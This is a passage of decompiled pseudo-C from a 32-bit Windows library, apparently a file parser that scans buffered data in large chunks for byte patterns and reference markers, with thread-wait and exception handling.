  int v5; // eax
  _DWORD *v6; // eax
  void *v7; // eax
  int v9[9]; // [esp-14h] [ebp-8Ch] BYREF
  int v10[5]; // [esp+10h] [ebp-68h] BYREF
  _DWORD v11[4]; // [esp+24h] [ebp-54h] BYREF
  _DWORD v12[4]; // [esp+34h] [ebp-44h] BYREF
  _DWORD v13[4]; // [esp+44h] [ebp-34h] BYREF
  int v14; // [esp+54h] [ebp-24h] BYREF
  int v15; // [esp+58h] [ebp-20h]
  void *v16[2]; // [esp+5Ch] [ebp-1Ch] BYREF
  _DWORD *v17; // [esp+64h] [ebp-14h]
  int v18; // [esp+68h] [ebp-10h]
  int v19; // [esp+74h] [ebp-4h]
  void *v20; // [esp+84h] [ebp+Ch]

  v3 = this;
  v17 = this;
  sub_10032E71(a2);
  v19 = 0;
  v18 = 1;
  sub_10037CF0(a3, (int)v16);
  v19 = 1;
  if ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v16[0] + 4))(v16[0]) )
  {
    while ( 1 )
    {
      sub_10046F82(v3, 0);
      v4 = (_DWORD *)(*(int (__thiscall **)(void *))(*(_DWORD *)v16[0] + 12))(v16[0]);
      sub_1000B36F(v4, (int)v10);
      LOBYTE(v19) = 2;
      sub_1000B36F(v10, (int)v9);
      LOBYTE(v19) = 2;
      sub_10046974((int)v3, &v14, v9[0], v9[1], v9[2], v9[3], v9[4]);
      v20 = (void *)sub_10046B33(dword_10186E08, v3, v14, v15);
      v5 = sub_10046B33(dword_10186E88, v3, v14, v15);
      if ( v5 != -1 )
      {
        v6 = sub_1004664E(v3, v12, v5 + dword_10186E94);
        LOBYTE(v19) = 4;
        sub_10046F01(v6, (int)a2);
        LOBYTE(v19) = 2;
        sub_10032EA8(v12);
      }
      if ( v20 != (void *)-1 )
      {
        sub_1004664E(v3, v13, (int)v20 + dword_10186E14);
        LOBYTE(v19) = 5;
        v7 = (void *)sub_100460DA(v11, v13);
        LOBYTE(v19) = 6;
        sub_10046F01(v7, (int)a2);
        LOBYTE(v19) = 5;
        sub_10032EA8(v11);
        LOBYTE(v19) = 2;
        sub_10032EA8(v13);
      }
      LOBYTE(v19) = 1;
      sub_1000B3DF(v10);
      sub_10042AAB((int)v16[0]);
      if ( (*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v16[0] + 4))(v16[0]) )
        break;
      v3 = v17;
    }
  }
  LOBYTE(v19) = 0;
  sub_1003406C(v16);
  return a2;
}
// 10186E08: using guessed type _DWORD dword_10186E08[3];
// 10186E14: using guessed type int dword_10186E14;
// 10186E88: using guessed type _DWORD dword_10186E88[3];
// 10186E94: using guessed type int dword_10186E94;
// 100460DA: using guessed type int var_68[5];
// 100460DA: using guessed type _DWORD var_44[4];
// 100460DA: using guessed type _DWORD var_34[4];
// 100460DA: using guessed type _DWORD var_54[4];

//----- (1004624E) --------------------------------------------------------
int __thiscall sub_1004624E(_DWORD *this, int a2)
{
  unsigned int v3; // edi
  int v4; // ecx
  int result; // eax
  _DWORD *v6; // eax
  char v7; // [esp+17h] [ebp-15h] BYREF
  int v8[5]; // [esp+18h] [ebp-14h] BYREF

  v3 = a2 + 10;
  for ( v8[0] = a2; v8[0] < v3; ++v8[0] )
  {
    sub_10046F82(this, 0);
    v7 = 0;
    sub_100467CF(v8[0], v4, &v7, this);
    if ( v7 != 32 && v7 != 13 && v7 != 10 )
      break;
  }
  result = v8[0];
  if ( v8[0] == v3 )
  {
    v6 = sub_1000E7F7(v8, 1, 0);
    v8[4] = 0;
    sub_10007882((int)v6);
  }
  return result;
}
// 100462A0: variable 'v4' is possibly undefined

//----- (100462FE) --------------------------------------------------------
_DWORD *__thiscall sub_100462FE(void *this, _DWORD *a2, _DWORD *a3)
{
  int *v4; // eax
  _DWORD *v5; // eax
  bool v6; // bl
  _DWORD *v7; // eax
  int v8; // esi
  LONG *v9; // eax
  int v11[5]; // [esp+10h] [ebp-48h] BYREF
  int v12[5]; // [esp+24h] [ebp-34h] BYREF
  int v13; // [esp+38h] [ebp-20h]
  int v14; // [esp+3Ch] [ebp-1Ch] BYREF
  int v15; // [esp+40h] [ebp-18h]
  int v16[4]; // [esp+44h] [ebp-14h] BYREF
  int v17; // [esp+54h] [ebp-4h]

  v17 = 0;
  v13 = 0;
  v4 = sub_10045454((int)this + dword_10186D64, (int)this, &v14);
  v5 = sub_10046723(a2, v11, *v4, v4[1]);
  v17 = 1;
  v6 = !sub_1000B4E7(v5, dword_10186D58);
  LOBYTE(v17) = 0;
  sub_1000B3DF(v11);
  if ( v6 )
  {
    v7 = sub_1000E7F7(&a2, 1, 0);
    v17 = 2;
    goto LABEL_3;
  }
  sub_10045454((int)this + 500000, (int)this + 1, &v14);
  v8 = v14;
  v15 = sub_10046B33(dword_10186D9C, a2, v14, v15);
  if ( v15 == -1 )
  {
    v7 = sub_1000E7F7(&a2, 1, 0);
    v17 = 3;
LABEL_3:
    sub_10007882((int)v7);
  }
  sub_10032E71(a3);
  v17 = 0;
  v13 = 1;
  sub_1000B1F3(0, (int)v12, 0);
  v17 = 4;
  for ( v16[0] = v8; v16[0] < v15; v16[0] = sub_1004624E(a2, v16[0]) )
  {
    v9 = (LONG *)sub_10046536(a2, v11, v16);
    LOBYTE(v17) = 5;
    sub_1000B3BD(v9, (int)v12);
    LOBYTE(v17) = 4;
    sub_1000B3DF(v11);
    sub_10034F16(a3, (int)v12);
  }
  LOBYTE(v17) = 0;
  sub_1000B3DF(v12);
  return a3;
}
// 10186D58: using guessed type _DWORD dword_10186D58[3];
// 10186D64: using guessed type int dword_10186D64;
// 10186D9C: using guessed type _DWORD dword_10186D9C[5];
// 100462FE: using guessed type int var_48[5];
// 100462FE: using guessed type int var_34[5];
// 100462FE: using guessed type int var_14[4];

//----- (10046450) --------------------------------------------------------
void *__thiscall sub_10046450(_DWORD *this, void *a2, _BYTE *a3, int a4, int a5)
{
  int v6; // edi
  char v7; // bl
  _BYTE *v8; // ecx
  _DWORD *v9; // eax
  int *v10; // eax
  char v12[13]; // [esp+17h] [ebp-11h] BYREF
  int v13; // [esp+24h] [ebp-4h]

  v6 = a4;
  v12[0] = 0;
  while ( v6 < a5 )
  {
    v7 = v12[0];
    if ( v12[0] == 32 || v12[0] == 13 || v12[0] == 10 )
      break;
    sub_10046F82(this, 0);
    v8 = a3;
    if ( a3 )
    {
      while ( *v8 )
      {
        if ( *v8 == v7 )
          goto LABEL_12;
        ++v8;
      }
    }
    sub_100467CF(v6++, (int)v8, v12, this);
  }
LABEL_12:
  if ( v6 == a5 )
  {
    v9 = sub_1000E7F7(&a3, 1, 0);
    v13 = 1;
    sub_10007882((int)v9);
  }
  if ( a4 == v6 )
  {
    sub_1000D17D(&a4, &word_10175184);
    v13 = 2;
    sub_1000B261((int)&a4, (int)a2, 0);
    LOBYTE(v13) = 0;
    sub_1000D3AD(&a4);
  }
  else
  {
    v10 = sub_10045454(v6 - 1, a4, &a4);
    sub_10046723(this, a2, *v10, v10[1]);
    v13 = 0;
  }
  return a2;
}
// 10046450: using guessed type char var_11[13];

//----- (10046536) --------------------------------------------------------
void *__stdcall sub_10046536(_DWORD *a1, void *a2, int *a3)
{
  int v3; // esi
  int v4; // edi
  _DWORD *v5; // eax
  int v6; // ecx
  _DWORD *v7; // eax
  int v9; // [esp-8h] [ebp-74h]
  int v10[5]; // [esp+10h] [ebp-5Ch] BYREF
  int v11[5]; // [esp+24h] [ebp-48h] BYREF
  int v12[5]; // [esp+38h] [ebp-34h] BYREF
  int v13[2]; // [esp+4Ch] [ebp-20h] BYREF
  int v14; // [esp+54h] [ebp-18h]
  int v15; // [esp+58h] [ebp-14h]
  char v16[9]; // [esp+5Fh] [ebp-Dh] BYREF
  int v17; // [esp+68h] [ebp-4h]

  v14 = 0;
  v3 = *a3;
  sub_1000B1F3(0, (int)v11, 0);
  v17 = 1;
  v4 = sub_1004624E(a1, v3);
  v15 = 2;
  do
  {
    sub_10045454(v4 + 10, v4, v13);
    sub_10046450(a1, v12, byte_101311DE, v13[0], v13[1]);
    LOBYTE(v17) = 2;
    v4 = sub_1004624E(a1, v4 + v12[3]);
    v5 = (_DWORD *)sub_1000B63D(v12, (int)v10, dword_10186DB8);
    LOBYTE(v17) = 3;
    sub_1000B544(v5, (int)v11);
    LOBYTE(v17) = 2;
    sub_1000B3DF(v10);
    LOBYTE(v17) = 1;
    sub_1000B3DF(v12);
    --v15;
  }
  while ( v15 );
  v16[0] = 0;
  sub_100467CF(v4, v6, v16, a1);
  if ( v16[0] != 82 )
  {
    v7 = sub_1000E7F7(&a1, 1, 0);
    LOBYTE(v17) = 4;
    sub_10007882((int)v7);
  }
  v9 = (int)a2;
  *a3 = v4 + 1;
  sub_1000B63D(v11, v9, dword_10186E4C);
  v14 = 1;
  LOBYTE(v17) = 0;
  sub_1000B3DF(v11);
  return a2;
}
// 100465F3: variable 'v6' is possibly undefined
// 101311DE: using guessed type _BYTE byte_101311DE[2];
// 10186DB8: using guessed type _DWORD dword_10186DB8[5];
// 10186E4C: using guessed type _DWORD dword_10186E4C[5];
// 10046536: using guessed type int var_48[5];
// 10046536: using guessed type int var_5C[5];
// 10046536: using guessed type char var_D[9];

//----- (1004664E) --------------------------------------------------------
_DWORD *__userpurge sub_1004664E@<eax>(_DWORD *a1@<ebx>, _DWORD *a2, int a3)
{
  void *v3; // edi
  int *v4; // eax
  _DWORD *v5; // eax
  void *v6; // eax
  int v8[5]; // [esp+10h] [ebp-40h] BYREF
  _DWORD v9[4]; // [esp+24h] [ebp-2Ch] BYREF
  int v10; // [esp+34h] [ebp-1Ch] BYREF
  int v11; // [esp+3Ch] [ebp-14h]
  bool v12; // [esp+43h] [ebp-Dh]
  int v13; // [esp+4Ch] [ebp-4h]

  v11 = 0;
  v3 = (void *)sub_1004624E(a1, a3);
  a3 = (int)v3;
  v4 = sub_10045454((int)v3 + 1, (int)v3, &v10);
  v5 = sub_10046723(a1, v8, *v4, v4[1]);
  v13 = 1;
  v12 = sub_1000B4E7(dword_10186D58, v5);
  LOBYTE(v13) = 0;
  sub_1000B3DF(v8);
  if ( v12 )
  {
    sub_100462FE(v3, a1, a2);
    v13 = 0;
    v11 = 1;
  }
  else
  {
    sub_10032E71(v9);
    v13 = 2;
    v6 = sub_10046536(a1, v8, &a3);
    LOBYTE(v13) = 3;
    sub_10034F16(v9, (int)v6);
    LOBYTE(v13) = 2;
    sub_1000B3DF(v8);
    sub_10039511(a2, (int)v9);
    v11 = 1;
    LOBYTE(v13) = 0;
    sub_10032EA8(v9);
  }
  return a2;
}
// 10186D58: using guessed type _DWORD dword_10186D58[3];
// 1004664E: using guessed type int var_40[5];
// 1004664E: using guessed type _DWORD var_2C[4];

//----- (10046723) --------------------------------------------------------
void *__thiscall sub_10046723(_DWORD *this, void *a2, int a3, unsigned int a4)
{
  signed int v5; // edx
  int v6; // ecx
  _DWORD *v7; // eax
  int v8; // eax
  int v9; // eax
  int v10; // eax
  int v11; // eax

  v5 = a4;
  v6 = a4 - a3;
  a4 -= a3;
  if ( a4 > 0x4C4B40 )
  {
    v7 = sub_1000E7F7(&a4, 1, 0);
    sub_10007882((int)v7);
  }
  v8 = this[9];
  if ( a3 < v8 || v5 > this[10] )
  {
    (*(void (__thiscall **)(_DWORD *, int, _DWORD))(*this + 8))(this, a3, 0);
    v9 = *this;
    this[9] = a3;
    v10 = a3 + (*(int (__thiscall **)(_DWORD *, _DWORD *))(v9 + 12))(this, this + 4);
    this[10] = v10;
    v11 = v10 - a3;
    if ( v11 >= (int)a4 )
      v11 = a4;
    sub_1000B6B7(this + 4, (int)a2, 0, v11);
  }
  else
  {
    sub_1000B6B7(this + 4, (int)a2, a3 - v8, v6);
  }
  return a2;
}

//----- (100467CF) --------------------------------------------------------
char __usercall sub_100467CF@<al>(int a1@<eax>, int a2@<ecx>, _BYTE *a3@<ebx>, _DWORD *a4@<esi>)
{
  int v5; // eax
  char *v6; // eax
  int v7; // edx
  int v8; // ecx
  char result; // al

  v5 = a4[9];
  if ( a1 < v5 || a1 > a4[10] )
  {
    (*(void (__thiscall **)(_DWORD *, int, _DWORD))(*a4 + 8))(a4, a1, 0);
    v7 = *a4;
    a4[9] = a1;
    a4[10] = a1 + (*(int (__thiscall **)(_DWORD *, _DWORD *))(v7 + 12))(a4, a4 + 4);
    v6 = (char *)sub_1000B4CB((int)(a4 + 4), v8, 0);
  }
  else
  {
    v6 = (char *)sub_1000B4CB((int)(a4 + 4), a2, a1 - v5);
  }
  result = *v6;
  *a3 = result;
  return result;
}
// 1004680F: variable 'v8' is possibly undefined

//----- (1004681B) --------------------------------------------------------
void __usercall sub_1004681B(int a1@<edi>)
{
  int v1; // esi
  int *v2; // eax
  int v3; // eax
  int *v4; // eax
  int v5; // ebx
  int *v6; // eax
  int v7; // eax
  int v8; // [esp+Ch] [ebp-50h] BYREF
  int v9[2]; // [esp+10h] [ebp-4Ch] BYREF
  int v10[2]; // [esp+18h] [ebp-44h] BYREF
  int v11; // [esp+20h] [ebp-3Ch] BYREF
  int v12; // [esp+28h] [ebp-34h] BYREF
  int v13; // [esp+30h] [ebp-2Ch] BYREF
  int v14[6]; // [esp+38h] [ebp-24h] BYREF
  int v15; // [esp+58h] [ebp-4h]

  if ( !*(_BYTE *)(a1 + 80) )
  {
    sub_10045454(0x7FFFFFFF, 0, v9);
    while ( 1 )
    {
      v1 = sub_10046B33(dword_10186D88, (_DWORD *)a1, v9[0], v9[1]);
      v9[0] = v1 + dword_10186D94;
      if ( v1 == -1 )
        break;
      v2 = sub_10045454(v1, v1 - 10, &v11);
      v3 = sub_10046C48(dword_10186E74, (_DWORD *)a1, *v2, v2[1]);
      if ( v3 == -1 )
      {
        v4 = sub_10045454(v1, v1 - 10, &v12);
        v3 = sub_10046C48(dword_10186D74, (_DWORD *)a1, *v4, v4[1]);
        if ( v3 == -1 )
          continue;
      }
      v5 = sub_1004624E((_DWORD *)a1, v3 + dword_10186E80);
      v6 = sub_10045454(dword_10186D94 + v1, v5, &v13);
      sub_10046723((_DWORD *)a1, v14, *v6, v6[1]);
      v15 = 0;
      sub_1000D2FA(v10, 0);
      LOBYTE(v15) = 2;
      sub_1000B3DF(v14);
      v7 = *(_DWORD *)(a1 + 44);
      v8 = v5;
      (*(void (__thiscall **)(int, int *, int *))(v7 + 24))(a1 + 44, v10, &v8);
      sub_10046F82((_DWORD *)a1, 0);
      v15 = -1;
      sub_1000D3AD(v10);
    }
    *(_BYTE *)(a1 + 80) = 1;
  }
}
// 10186D74: using guessed type _DWORD dword_10186D74[5];
// 10186D88: using guessed type _DWORD dword_10186D88[3];
// 10186D94: using guessed type int dword_10186D94;
// 10186E74: using guessed type _DWORD dword_10186E74[3];
// 10186E80: using guessed type int dword_10186E80;
// 1004681B: using guessed type int var_24[6];

//----- (10046974) --------------------------------------------------------
_DWORD *__thiscall sub_10046974(int this, _DWORD *a2, int a3, int a4, int a5, int a6, int a7)
{
  _DWORD *v8; // eax
  int v9; // ebx
  int v10; // esi
  int *v11; // eax
  int v12; // esi
  int *v13; // eax
  int *v14; // eax
  int *v15; // eax
  int v16; // eax
  int v18[5]; // [esp+10h] [ebp-30h] BYREF
  _DWORD v19[2]; // [esp+24h] [ebp-1Ch] BYREF
  int v20[4]; // [esp+2Ch] [ebp-14h] BYREF
  int v21; // [esp+3Ch] [ebp-4h]

  v21 = 0;
  if ( *(_DWORD *)(this + 100) <= 0x4C4B40u )
  {
    if ( !*(_BYTE *)(this + 80) )
      sub_1004681B(this);
    sub_1000D2FA(v20, 0);
    LOBYTE(v21) = 1;
    if ( (*(unsigned __int8 (__thiscall **)(int, int *))(*(_DWORD *)(this + 44) + 8))(this + 44, v20) )
    {
      v9 = a6;
      v10 = v9 + *(_DWORD *)(*(int (__thiscall **)(int, int *))(*(_DWORD *)(this + 44) + 16))(this + 44, v20);
      LOBYTE(v21) = 0;
      sub_1000D3AD(v20);
      goto LABEL_15;
    }
    v8 = sub_1000E7F7(&a2, 1, 0);
    LOBYTE(v21) = 2;
LABEL_6:
    sub_10007882((int)v8);
  }
  v11 = sub_10045454(0x7FFFFFFF, 0, v20);
  v12 = sub_10046B33(&a3, (_DWORD *)this, *v11, v11[1]);
  while ( 1 )
  {
    if ( v12 == -1 )
    {
      v8 = sub_1000E7F7(&a2, 1, 0);
      LOBYTE(v21) = 4;
      goto LABEL_6;
    }
    v13 = sub_10045454(v12, v12 - dword_10186E80, v20);
    sub_10046723((_DWORD *)this, v18, *v13, v13[1]);
    LOBYTE(v21) = 3;
    if ( sub_1000B4E7(v18, dword_10186E74) || sub_1000B4E7(v18, dword_10186D74) )
      break;
    v14 = sub_10045454(0x7FFFFFFF, a6 + v12, v19);
    v12 = sub_10046B33(&a3, (_DWORD *)this, *v14, v14[1]);
    LOBYTE(v21) = 0;
    sub_1000B3DF(v18);
  }
  LOBYTE(v21) = 0;
  sub_1000B3DF(v18);
  v10 = a6 + v12;
LABEL_15:
  v15 = sub_10045454(v10 + 5000000, v10, v19);
  v16 = sub_10046B33(dword_10186D1C, (_DWORD *)this, *v15, v15[1]);
  if ( v16 == -1 )
  {
    v8 = sub_1000E7F7(&a2, 1, 0);
    LOBYTE(v21) = 5;
    goto LABEL_6;
  }
  sub_10045454(v16, v10, a2);
  v21 = -1;
  sub_1000B3DF(&a3);
  return a2;
}
// 10046AAE: conditional instruction was optimized away because esi.4!=FFFFFFFF
// 10186D1C: using guessed type _DWORD dword_10186D1C[5];
// 10186D74: using guessed type _DWORD dword_10186D74[5];
// 10186E74: using guessed type _DWORD dword_10186E74[3];
// 10186E80: using guessed type int dword_10186E80;
// 10046974: using guessed type int var_30[5];
// 10046974: using guessed type _DWORD var_1C[2];

//----- (10046B33) --------------------------------------------------------
int __fastcall sub_10046B33(_DWORD *a1, _DWORD *a2, int a3, int a4)
{
  int v6; // ebx
  int *v8; // eax
  int v9; // eax
  int v10; // esi
  int v11; // [esp+10h] [ebp-34h]
  int v12; // [esp+14h] [ebp-30h]
  int v13; // [esp+18h] [ebp-2Ch] BYREF
  int v14[6]; // [esp+20h] [ebp-24h] BYREF
  int v15; // [esp+40h] [ebp-4h]

  v6 = a3;
  v11 = a3;
  (*(void (__thiscall **)(_DWORD *, int, _DWORD))(*a2 + 8))(a2, a3, 0);
  if ( (*(int (__thiscall **)(_DWORD *))(*a2 + 24))(a2) )
  {
    while ( v6 < a4 - a1[3] )
    {
      sub_10047090(a2);
      v12 = a4 - v6;
      if ( (unsigned int)(a4 - v6) >= 0x4C4B40 )
        v12 = 5000000;
      v8 = sub_10045454(v12 + v6, v6, &v13);
      sub_10046723(a2, v14, *v8, v8[1]);
      v15 = 0;
      v9 = sub_10046EA1(a2, v14, a1, 0);
      if ( v9 != -1 )
      {
        v10 = v9 + v11;
        v15 = -1;
        sub_1000B3DF(v14);
        return v10;
      }
      v11 += v12 - a1[3] + 1;
      v15 = -1;
      sub_1000B3DF(v14);
      if ( !(*(int (__thiscall **)(_DWORD *))(*a2 + 24))(a2) )
        return -1;
      v6 = v11;
    }
  }
  return -1;
}
// 10046B33: using guessed type int var_24[6];

//----- (10046C48) --------------------------------------------------------
int __userpurge sub_10046C48@<eax>(_DWORD *a1@<ebx>, _DWORD *a2, int a3, int a4)
{
  int v4; // edi
  _DWORD *v5; // esi
  int v6; // eax
  int *v7; // eax
  int v8; // esi
  int v9; // eax
  const void *v11; // [esp-8h] [ebp-44h]
  size_t v12; // [esp-4h] [ebp-40h]
  int v13[3]; // [esp+10h] [ebp-2Ch] BYREF
  unsigned int v14; // [esp+1Ch] [ebp-20h]
  int v15; // [esp+24h] [ebp-18h] BYREF
  char v16; // [esp+2Fh] [ebp-Dh]
  int v17; // [esp+38h] [ebp-4h]

  v4 = a4 - 5000000;
  if ( a3 > a4 - 5000000 )
    v4 = a3;
  v5 = a2;
  (*(void (__thiscall **)(_DWORD *, int, _DWORD))(*a2 + 8))(a2, v4, 0);
  v16 = 0;
  while ( 1 )
  {
    v6 = 5000000;
    if ( (unsigned int)(a4 - v4) < 0x4C4B40 )
      v6 = a4 - v4;
    v7 = sub_10045454(v6 + v4, v4, &v15);
    sub_10046723(v5, v13, *v7, v7[1]);
    v17 = 0;
    if ( v14 < a1[3] )
      goto LABEL_13;
    sub_10047090(v5);
    v8 = v14 - a1[3];
    if ( v8 < 0 )
    {
LABEL_10:
      v8 = -1;
    }
    else
    {
      while ( 1 )
      {
        v12 = a1[3];
        v11 = (const void *)sub_1000B4B8(a1);
        v9 = sub_1000B4B8(v13);
        if ( !memcmp((const void *)(v8 + v9), v11, v12) )
          break;
        if ( --v8 < 0 )
          goto LABEL_10;
      }
    }
    if ( v8 != -1 )
      break;
    v5 = a2;
LABEL_13:
    if ( v4 == a3 )
    {
      v16 = 1;
    }
    else
    {
      v4 = v4 + a1[3] - 5000001;
      if ( v4 < a3 )
        v4 = a3;
    }
    sub_10046F82(v5, 0);
    v17 = -1;
    sub_1000B3DF(v13);
    if ( v16 )
      return -1;
  }
  v17 = -1;
  sub_1000B3DF(v13);
  return v8 + v4;
}
// 10046C48: using guessed type int var_2C[3];

//----- (10046D48) --------------------------------------------------------
int __userpurge sub_10046D48@<eax>(_DWORD *a1@<eax>, _DWORD *a2, int a3, int a4)
{
  int v5; // edi
  int *v6; // eax
  int v7; // ecx
  int result; // eax
  int v9; // ecx
  int v10; // [esp+10h] [ebp-14h] BYREF
  int v11; // [esp+18h] [ebp-Ch]
  char v12[5]; // [esp+1Fh] [ebp-5h] BYREF

  v5 = a3 - 1;
  while ( 1 )
  {
    sub_10046F82(a1, 0);
    v6 = sub_10045454(a4, v5 + 1, &v10);
    v5 = sub_10046B33(a2, a1, *v6, v6[1]);
    result = -1;
    if ( v5 == -1 )
      break;
    v12[0] = 0;
    v11 = v5 - 1;
    sub_100467CF(v5 - 1, v7, v12, a1);
    while ( v11 >= a3 )
    {
      LOBYTE(v9) = v12[0];
      if ( v12[0] != *(_BYTE *)(dword_10186E24 + *(_DWORD *)(dword_10186E20 + 12)) )
        break;
      sub_100467CF(--v11, v9, v12, a1);
    }
    if ( v5 <= 0 || (v5 - v11 + 1) % 2 != 1 )
      return v5;
  }
  return result;
}
// 10046D94: variable 'v7' is possibly undefined
// 10046DC0: variable 'v9' is possibly undefined
// 10186E20: using guessed type int dword_10186E20;
// 10186E24: using guessed type int dword_10186E24;

//----- (10046DF5) --------------------------------------------------------
int __userpurge sub_10046DF5@<eax>(_DWORD *a1@<eax>, _DWORD *a2, int a3, int a4)
{
  int v5; // edi
  int *v6; // eax
  int v7; // ecx
  int result; // eax
  int v9; // ecx
  int v10; // [esp+10h] [ebp-14h] BYREF
  int v11; // [esp+18h] [ebp-Ch]
  char v12[5]; // [esp+1Fh] [ebp-5h] BYREF

  v5 = a4 + 1;
  while ( 1 )
  {
    sub_10046F82(a1, 0);
    v6 = sub_10045454(v5 - 1, a3, &v10);
    v5 = sub_10046C48(a2, a1, *v6, v6[1]);
    result = -1;
    if ( v5 == -1 )
      break;
    v12[0] = 0;
    v11 = v5 - 1;
    sub_100467CF(v5 - 1, v7, v12, a1);
    while ( v11 >= a3 )
    {
      LOBYTE(v9) = v12[0];
      if ( v12[0] != *(_BYTE *)(dword_10186E24 + *(_DWORD *)(dword_10186E20 + 12)) )
        break;
      sub_100467CF(--v11, v9, v12, a1);
    }
    if ( v5 <= 0 || (v5 - v11 + 1) % 2 != 1 )
      return v5;
  }
  return result;
}
// 10046E40: variable 'v7' is possibly undefined
// 10046E6C: variable 'v9' is possibly undefined
// 10186E20: using guessed type int dword_10186E20;
// 10186E24: using guessed type int dword_10186E24;

//----- (10046EA1) --------------------------------------------------------
int __userpurge sub_10046EA1@<eax>(_DWORD *a1@<ecx>, _DWORD *a2@<ebx>, _DWORD *a3@<edi>, int a4)
{
  int v4; // esi
  int v5; // eax
  const void *v7; // [esp-8h] [ebp-10h]
  size_t Size; // [esp+4h] [ebp-4h]

  if ( a2[3] < a3[3] )
    return -1;
  sub_10047090(a1);
  v4 = a2[3] - a3[3];
  Size = a3[3];
  if ( a4 > v4 )
    return -1;
  while ( 1 )
  {
    v7 = (const void *)sub_1000B4B8(a3);
    v5 = sub_1000B4B8(a2);
    if ( !memcmp((const void *)(a4 + v5), v7, Size) )
      break;
    if ( ++a4 > v4 )
      return -1;
  }
  return a4;
}

//----- (10046F01) --------------------------------------------------------
void __usercall sub_10046F01(void *a1@<ecx>, int a2@<edi>)
{
  int v2; // eax
  void *v3[3]; // [esp+Ch] [ebp-18h] BYREF
  int v4; // [esp+20h] [ebp-4h]

  sub_10037CF0(a1, (int)v3);
  v4 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v3[0] + 4))(v3[0]) )
  {
    v2 = (*(int (__thiscall **)(void *))(*(_DWORD *)v3[0] + 12))(v3[0]);
    (*(void (__thiscall **)(int, int))(*(_DWORD *)a2 + 36))(a2, v2);
    sub_10042AAB((int)v3[0]);
  }
  v4 = -1;
  sub_1003406C(v3);
}

//----- (10046F82) --------------------------------------------------------
char __thiscall sub_10046F82(_DWORD *this, DWORD dwMilliseconds)
{
  void *v3; // eax
  __int32 v4; // eax
  int v5; // ecx
  const struct Concurrency::SchedulerPolicy *v6; // eax
  _DWORD *v7; // eax
  const struct Concurrency::SchedulerPolicy *v8; // eax
  int v10; // [esp-8h] [ebp-2Ch] BYREF
  int v11; // [esp-4h] [ebp-28h]
  int v12[2]; // [esp+8h] [ebp-1Ch] BYREF
  int pExceptionObject[2]; // [esp+10h] [ebp-14h] BYREF
  int v14; // [esp+20h] [ebp-4h]

  v3 = (void *)this[21];
  if ( v3 )
  {
    v4 = WaitForSingleObjectEx(v3, dwMilliseconds, 1);
    if ( v4 != 258 )
    {
      sub_10029BC2(v4);
      sub_1000D17D(v12, &word_10175188);
      v14 = 0;
      v11 = v5;
      v10 = v5;
      pExceptionObject[0] = (int)&v10;
      sub_1000728E(&v10, 0);
      LOBYTE(v14) = 0;
      sub_1004F292((_DWORD *)dword_10182DE8, 13, (int)v12, v10, v11);
      v14 = -1;
      sub_1000D3AD(v12);
      v6 = (const struct Concurrency::SchedulerPolicy *)sub_1004548C(pExceptionObject);
      v14 = 2;
      v11 = 784;
      sub_100470BB(v6);
    }
  }
  v7 = (_DWORD *)this[23];
  if ( v7 )
  {
    LOBYTE(v7) = sub_10022997(v7);
    if ( (_BYTE)v7 )
    {
      v8 = (const struct Concurrency::SchedulerPolicy *)sub_1003592A(v12);
      v14 = 3;
      Concurrency::details::ThreadScheduler::ThreadScheduler(
        (Concurrency::details::ThreadScheduler *)pExceptionObject,
        v8);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVCdxOxsdsctwnrVpjjoacDxoxsdsct_BurqUpfqufhkrx_wvnem__);
    }
  }
  return (char)v7;
}
// 10046FE5: variable 'v5' is possibly undefined
// 10182DE8: using guessed type int dword_10182DE8;

//----- (10047090) --------------------------------------------------------
char __usercall sub_10047090@<al>(_DWORD *a1@<esi>)
{
  unsigned int v1; // eax

  sub_10046F82(a1, 0);
  v1 = ++a1[22];
  if ( v1 >= 0xA )
  {
    LOBYTE(v1) = sub_10046F82(a1, 0xAu);
    a1[22] = 0;
  }
  return v1;
}

//----- (100470BB) --------------------------------------------------------
void __cdecl __noreturn sub_100470BB(const struct Concurrency::SchedulerPolicy *pExceptionObject)
{
  Concurrency::details::ThreadScheduler::ThreadScheduler(
    (Concurrency::details::ThreadScheduler *)&pExceptionObject,
    pExceptionObject);
  _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVWvieApfejAneqmeAwvieapfe_gfjjefwq_sr__);
}

//----- (1004710C) --------------------------------------------------------
_DWORD *__stdcall sub_1004710C(_DWORD *a1, int a2, int a3)
{
  int v3; // eax
  _DWORD *v4; // esi
  int v5; // eax
  int v6; // eax
  int v8[6]; // [esp+10h] [ebp-1Ch] BYREF
  int v9; // [esp+28h] [ebp-4h]

  sub_10042E1B(a1, a2, a3);
  v9 = 0;
  *a1 = &off_101040EC;
  HIBYTE(a3) = 1;
  v3 = sub_10047404((int)v8, (int)&unk_10186EDC, (_BYTE *)&a3 + 3);
  LOBYTE(v9) = 1;
  v4 = a1 + 1;
  (*(void (__thiscall **)(_DWORD *, int))(*v4 + 36))(v4, v3);
  LOBYTE(v9) = 0;
  sub_10037CC9(v8);
  HIBYTE(a3) = 1;
  v5 = sub_10047404((int)v8, (int)&unk_10186ECC, (_BYTE *)&a3 + 3);
  LOBYTE(v9) = 2;
  (*(void (__thiscall **)(_DWORD *, int))(*v4 + 36))(v4, v5);
  LOBYTE(v9) = 0;
  sub_10037CC9(v8);
  HIBYTE(a3) = 0;
  v6 = sub_10047404((int)v8, (int)&unk_10186ED4, (_BYTE *)&a3 + 3);
  LOBYTE(v9) = 3;
  (*(void (__thiscall **)(_DWORD *, int))(*v4 + 36))(v4, v6);
  LOBYTE(v9) = 0;
  sub_10037CC9(v8);
  return a1;
}
// 101040EC: using guessed type int (__thiscall *off_101040EC)(void *Block, char);
// 1004710C: using guessed type int var_1C[6];

//----- (100471C9) --------------------------------------------------------
int *__thiscall sub_100471C9(int *Block, char a2)
{
  sub_100471E5(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100471E5) --------------------------------------------------------
void __thiscall sub_100471E5(int *this)
{
  *this = (int)&off_101040EC;
  sub_10042E6F(this);
}
// 101040EC: using guessed type int (__thiscall *off_101040EC)(void *Block, char);

//----- (10047209) --------------------------------------------------------
void *__thiscall sub_10047209(_DWORD *this, void *a2, void *a3, _DWORD *a4, int a5)
{
  int v6; // ecx
  int v7; // ecx
  unsigned __int64 v8; // rax
  int v9; // ecx
  unsigned int v10; // eax
  unsigned int v11; // esi
